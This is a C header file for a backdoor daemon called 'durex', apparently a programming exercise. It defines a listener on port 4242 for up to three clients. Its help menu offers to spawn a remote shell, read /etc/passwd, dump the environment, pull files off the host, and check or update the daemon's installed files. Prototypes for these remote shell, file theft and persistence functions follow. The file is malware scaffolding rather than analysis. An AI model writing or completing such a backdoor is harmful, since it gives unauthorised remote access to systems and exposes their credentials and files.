#ifndef _DUREX_H 
# define _DUREX_H 

# include <sys/stat.h> 
# include <sys/types.h> 
# include <sys/time.h> 
# include <sys/wait.h> 
# include <sys/socket.h> 
# include <sys/types.h> 
# include <netinet/in.h> 
# include <arpa/inet.h> 
# include <unistd.h> 
# include <stdio.h> 
# include <stdlib.h> 
# include <fcntl.h> 
# include <string.h> 
# include <signal.h> 

# define TRUE			1
# define FALSE			0
# define MAXCLIENTS 	3
# define IN_SHELL		1 
# define LOGGING		2 
# define LOGGED			3 
# define WAITING		4 
# define LOGFAIL		5
# define DISCONNECTED	-1
# define CMD_QUIT		-2
# define PORT 			4242
# define USAGEMSG		"help menu:\nshell\tspawn shell\nquit\tTerminate durex process\npasswd\tget /etc/passwd\nenv\tget the env\nget\tget a file from host\ncheck\tcheck the installation of daemon files\nupdate\tupdate installation on daemon files\n"
# define INVALIDCMD		"Invalid command, see help menu for a list of available commands\n"
# define EOPENPASSWD	"Cannot open /etc/passwd\n"
# define EREADPASSWD	"Cannot read /etc/passwd\n"
# define EDUPSHELL		"Cannot dup fds, cannot spawn shell\n"
# define EFORKSHELL		"Cannot fork, cannot spawn shell\n"

typedef struct s_ctx	t_ctx;

struct					__attribute__((packed, aligned(4))) s_client
{
	int 				fd;
	int 				status;
	int 				pid;
};

struct					__attribute__((packed, aligned(4))) s_ctx
{
	int 				msock;
	int 				mport;
	fd_set 				stream;
	int 				io;
	struct sockaddr_in	rsock;
	struct s_client		client[MAXCLIENTS];
};

t_ctx					durex;

/*
						commands.c -> remote shell functions
*/
void 					_shchk(struct s_client *client);
int 					_help(struct s_client *client);
int 					_shlaunch(struct s_client *client);
int 					_shpasswd(struct s_client *client);
int 					_shenv(struct s_client *client, char **envp);
int 					_shfile(struct s_client *client, char *buf);
/*
						util.c -> utility functions
*/
int						_servlog(char *s, struct s_client *client);
void					_log(char *s, int fd);
void					_exit(int errcd);
/*
						hash.c -> generate hash
*/
uint32_t    			_hash(char *key, size_t len);
/*
						daemon.c -> daemon utils
*/
int						_init_daemon(int f);
int    					_schk_daemon(struct s_client *client);
/*
						durex.c -> run main program utility
*/
void					_rundurex(char **envp);
/*
						signal.c - > signal handler method
*/
void					_sighandler(void);

#endif
